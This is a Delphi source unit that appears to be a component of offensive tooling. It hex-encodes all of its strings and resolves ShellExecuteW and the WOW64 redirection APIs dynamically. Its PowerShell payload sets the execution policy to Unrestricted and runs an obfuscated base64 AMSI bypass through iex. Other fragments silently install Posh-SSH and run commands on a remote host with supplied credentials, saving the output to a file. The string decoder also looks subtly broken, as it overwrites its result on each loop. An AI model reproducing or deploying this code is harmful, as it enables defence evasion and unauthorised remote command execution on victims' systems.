unit CodeUnitSSH;

interface

uses GetLibModHandleSSH;

const
  // kernel32.dll
  HSH0:Array[0..11] of string=('6B','65','72','6E','65','6C','33','32','2E','64','6C','6C');
  // shell32.dll
  HSH1:Array[0..10] of string=('73','68','65','6C','6C','33','32','2E','64','6C','6C');
  // ShellExecuteW
  HSH2:Array[0..12] of string=('53','68','65','6C','6C','45','78','65','63','75','74','65','57');
  // Wow64DisableWow64FsRedirection
  HSH3:Array[0..29] of string=('57','6F','77','36','34','44','69','73','61','62','6C','65','57','6F','77',
  '36','34','46','73','52','65','64','69','72','65','63','74','69','6F','6E');
  // Wow64RevertWow64FsRedirection
  HSH4:Array[0..28] of string=('57','6F','77','36','34','52','65','76','65','72','74','57','6F','77','36',
  '34','46','73','52','65','64','69','72','65','63','74','69','6F','6E');
  // Powershell
  HCOM:Array[0..9] of string=('50','6F','77','65','72','73','68','65','6C','6C');
  // 192.168.100.5
  HCOM1:Array[0..12] of string=('31','39','32','2E','31','36','38','2E','31','30','30','2E','35');
  // ipconfig
  HCOM2:Array[0..7] of string=('69','70','63','6F','6E','66','69','67');
  // -C "Set-ExecutionPolicy Unrestricted; $FEIfwuioehfaiwyYOETWTRuwye = 'a'+'ms'+'iI'+'ni'+'tF'+'a'; $EF8034uowieypowiue = 'il'+'ed'; $Ceoiuwjoeuyfw = 'Sy'+'st'+'em.Ma'+'na'+'gem'+'ent.'+'Aut'+'omat'+'io'+'n.A'+'ms'+'iUt'+'ils';$DFiowjhOHWOHEOUF = $null; sleep 1; $text = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgkQ2VvaXV3am9ldXlmdykuR2V0RmllbGQoJEZFSWZ3dWlvZWhmYWl3eVlPRVRXVFJ1d3llICsgJEVGODAzNHVvd2lleXBvd2l1ZSwiTm9uUCIgKyAidWIiICsgImxpYyxTdCIgKyAiYXRpYyIpLlNldFZhbHVlKCRERmlvd2poT0hXT0hFT1VGLCR0cnVlKQ==')); iex $text; sleep 1;
  HCOM3:Array[0..592] of string=('2D','43','20','22','53','65','74','2D','45','78','65','63','75','74','69',
  '6F','6E','50','6F','6C','69','63','79','20','55','6E','72','65','73','74',
  '72','69','63','74','65','64','3B','20','24','46','45','49','66','77','75',
  '69','6F','65','68','66','61','69','77','79','59','4F','45','54','57','54',
  '52','75','77','79','65','20','3D','20','27','61','27','2B','27','6D','73',
  '27','2B','27','69','49','27','2B','27','6E','69','27','2B','27','74','46',
  '27','2B','27','61','27','3B','20','24','45','46','38','30','33','34','75',
  '6F','77','69','65','79','70','6F','77','69','75','65','20','3D','20','27',
  '69','6C','27','2B','27','65','64','27','3B','20','24','43','65','6F','69',
  '75','77','6A','6F','65','75','79','66','77','20','3D','20','27','53','79',
  '27','2B','27','73','74','27','2B','27','65','6D','2E','4D','61','27','2B',
  '27','6E','61','27','2B','27','67','65','6D','27','2B','27','65','6E','74',
  '2E','27','2B','27','41','75','74','27','2B','27','6F','6D','61','74','27',
  '2B','27','69','6F','27','2B','27','6E','2E','41','27','2B','27','6D','73',
  '27','2B','27','69','55','74','27','2B','27','69','6C','73','27','3B','24',
  '44','46','69','6F','77','6A','68','4F','48','57','4F','48','45','4F','55',
  '46','20','3D','20','24','6E','75','6C','6C','3B','20','73','6C','65','65',
  '70','20','31','3B','20','24','74','65','78','74','20','3D','20','5B','53',
  '79','73','74','65','6D','2E','54','65','78','74','2E','45','6E','63','6F',
  '64','69','6E','67','5D','3A','3A','41','53','43','49','49','2E','47','65',
  '74','53','74','72','69','6E','67','28','5B','53','79','73','74','65','6D',
  '2E','43','6F','6E','76','65','72','74','5D','3A','3A','46','72','6F','6D',
  '42','61','73','65','36','34','53','74','72','69','6E','67','28','27','57',
  '31','4A','6C','5A','6C','30','75','51','58','4E','7A','5A','57','31','69',
  '62','48','6B','75','52','32','56','30','56','48','6C','77','5A','53','67',
  '6B','51','32','56','76','61','58','56','33','61','6D','39','6C','64','58',
  '6C','6D','64','79','6B','75','52','32','56','30','52','6D','6C','6C','62',
  '47','51','6F','4A','45','5A','46','53','57','5A','33','64','57','6C','76',
  '5A','57','68','6D','59','57','6C','33','65','56','6C','50','52','56','52',
  '58','56','46','4A','31','64','33','6C','6C','49','43','73','67','4A','45',
  '56','47','4F','44','41','7A','4E','48','56','76','64','32','6C','6C','65',
  '58','42','76','64','32','6C','31','5A','53','77','69','54','6D','39','75',
  '55','43','49','67','4B','79','41','69','64','57','49','69','49','43','73',
  '67','49','6D','78','70','59','79','78','54','64','43','49','67','4B','79',
  '41','69','59','58','52','70','59','79','49','70','4C','6C','4E','6C','64',
  '46','5A','68','62','48','56','6C','4B','43','52','45','52','6D','6C','76',
  '64','32','70','6F','54','30','68','58','54','30','68','46','54','31','56',
  '47','4C','43','52','30','63','6E','56','6C','4B','51','3D','3D','27','29',
  '29','3B','20','69','65','78','20','24','74','65','78','74','3B','20','73',
  '6C','65','65','70','20','31','3B','20');
  // if (-not (Get-Module -Name Posh-SSH -ErrorAction SilentlyContinue)) { Install-Module -Name Posh-SSH -Force -AllowClobber -Scope CurrentUser }; Import-Module Posh-SSH; $passA = ConvertTo-SecureString '
  HCOM4:Array[0..199] of string=('69','66','20','28','2D','6E','6F','74','20','28','47','65','74','2D','4D',
  '6F','64','75','6C','65','20','2D','4E','61','6D','65','20','50','6F','73',
  '68','2D','53','53','48','20','2D','45','72','72','6F','72','41','63','74',
  '69','6F','6E','20','53','69','6C','65','6E','74','6C','79','43','6F','6E',
  '74','69','6E','75','65','29','29','20','7B','20','49','6E','73','74','61',
  '6C','6C','2D','4D','6F','64','75','6C','65','20','2D','4E','61','6D','65',
  '20','50','6F','73','68','2D','53','53','48','20','2D','46','6F','72','63',
  '65','20','2D','41','6C','6C','6F','77','43','6C','6F','62','62','65','72',
  '20','2D','53','63','6F','70','65','20','43','75','72','72','65','6E','74',
  '55','73','65','72','20','7D','3B','20','49','6D','70','6F','72','74','2D',
  '4D','6F','64','75','6C','65','20','50','6F','73','68','2D','53','53','48',
  '3B','20','24','70','61','73','73','41','20','3D','20','43','6F','6E','76',
  '65','72','74','54','6F','2D','53','65','63','75','72','65','53','74','72',
  '69','6E','67','20','27');
  // ' -AsPlainText -Force; $sessionsshA = New-Object System.Management.Automation.PSCredential ('
  HCOM5:Array[0..92] of string=('27','20','2D','41','73','50','6C','61','69','6E','54','65','78','74','20',
  '2D','46','6F','72','63','65','3B','20','24','73','65','73','73','69','6F',
  '6E','73','73','68','41','20','3D','20','4E','65','77','2D','4F','62','6A',
  '65','63','74','20','53','79','73','74','65','6D','2E','4D','61','6E','61',
  '67','65','6D','65','6E','74','2E','41','75','74','6F','6D','61','74','69',
  '6F','6E','2E','50','53','43','72','65','64','65','6E','74','69','61','6C',
  '20','28','27');
  // ', $passA); $sshSession = New-SSHSession -ComputerName '
  HCOM6:Array[0..55] of string=('27','2C','20','24','70','61','73','73','41','29','3B','20','24','73','73',
  '68','53','65','73','73','69','6F','6E','20','3D','20','4E','65','77','2D',
  '53','53','48','53','65','73','73','69','6F','6E','20','2D','43','6F','6D',
  '70','75','74','65','72','4E','61','6D','65','20','27');
  // ' -Credential $sessionsshA -Port
  HCOM7:Array[0..32] of string=('27','20','2D','43','72','65','64','65','6E','74','69','61','6C','20','24',
  '73','65','73','73','69','6F','6E','73','73','68','41','20','2D','50','6F',
  '72','74','20');
  // ; $commandResult = Invoke-SSHCommand -SSHSession $sshSession -Command '
  HCOM8:Array[0..70] of string=('3B','20','24','63','6F','6D','6D','61','6E','64','52','65','73','75','6C',
  '74','20','3D','20','49','6E','76','6F','6B','65','2D','53','53','48','43',
  '6F','6D','6D','61','6E','64','20','2D','53','53','48','53','65','73','73',
  '69','6F','6E','20','24','73','73','68','53','65','73','73','69','6F','6E',
  '20','2D','43','6F','6D','6D','61','6E','64','20','27');
  // '; Write-Output $commandResult.Output; Remove-SSHSession -SSHSession $sshSession; $commandResult.Output > '
  HCOM9:Array[0..106] of string=('27','3B','20','57','72','69','74','65','2D','4F','75','74','70','75','74',
  '20','24','63','6F','6D','6D','61','6E','64','52','65','73','75','6C','74',
  '2E','4F','75','74','70','75','74','3B','20','52','65','6D','6F','76','65',
  '2D','53','53','48','53','65','73','73','69','6F','6E','20','2D','53','53',
  '48','53','65','73','73','69','6F','6E','20','24','73','73','68','53','65',
  '73','73','69','6F','6E','3B','20','24','63','6F','6D','6D','61','6E','64',
  '52','65','73','75','6C','74','2E','4F','75','74','70','75','74','20','3E',
  '20','27');
  // '";
  HCOM10:Array[0..2] of string=('27','22','3B');

  function HATS(const hexarr:array of string): Ansistring;
  procedure SEW(hWnd: THandle;
  Operation, FileName, Parameters, Directory: WideString;
  ShowCmd: Integer);
  procedure WoW1(Var Wow64FsEnableRedirection: LongBool);
  procedure WoW2(Var Wow64FsEnableRedirection: LongBool);

implementation

  function HATS(const hexarr:array of string): Ansistring;
  var
   i:Integer;
  function SToI(const S: string): Integer;
  var E: Integer;
  begin
    Val(S, Result,E);
  end;
  function HToS(hex: Ansistring): Ansistring;
  var
  i: Integer;
  begin
    for i:= 1 to Length(hex) div 2 do
    begin
      Result := Result + AnsiChar(SToI('$' +  String(Copy(hex, (i-1) * 2 + 1, 2)) ));
    end;
  end;
  begin
    for i:= 0 to Length(hexarr)-1 do
    begin
      Result :=  HToS(AnsiString(hexarr[i]));
    end;
  end;

  procedure SEW(hWnd: THandle;
    Operation, FileName, Parameters, Directory: WideString;
    ShowCmd: Integer);
  var
  SE: function(hWnd: THandle;
    Operation, FileName, Parameters, Directory: WideString;
    ShowCmd: Integer): HINST; stdcall;
  HM:HMODULE;
  begin
    try
      HM := LoadLibrary(PChar(string(HATS(HSH1))));
      @SE := GetProcAddress(HM, PChar(string(HATS(HSH2))));
      SE(hWnd, Operation, FileName, Parameters, Directory, ShowCmd);
      FreeLibrary(HM);
    except
    ;
    end;
  end;

  procedure WoW1(Var Wow64FsEnableRedirection: LongBool);
  var
  SE: function(Var Wow64FsEnableRedirection: LongBool): LongBool; stdcall;
  HM:HMODULE;
  begin
    try
      HM := LoadLibrary(PChar(string(HATS(HSH0))));
      @SE := GetProcAddress(HM, PChar(string(HATS(HSH3))));
      SE(Wow64FsEnableRedirection);
      FreeLibrary(HM);
    except
    ;
    end;
  end;

  procedure WoW2(Var Wow64FsEnableRedirection: LongBool);
  var
  SE: function(Var Wow64FsEnableRedirection: LongBool): LongBool; stdcall;
  HM:HMODULE;
  begin
    try
      HM := LoadLibrary(PChar(string(HATS(HSH0))));
      @SE := GetProcAddress(HM, PChar(string(HATS(HSH4))));
      SE(Wow64FsEnableRedirection);
      FreeLibrary(HM);
    except
    ;
    end;
  end;

end.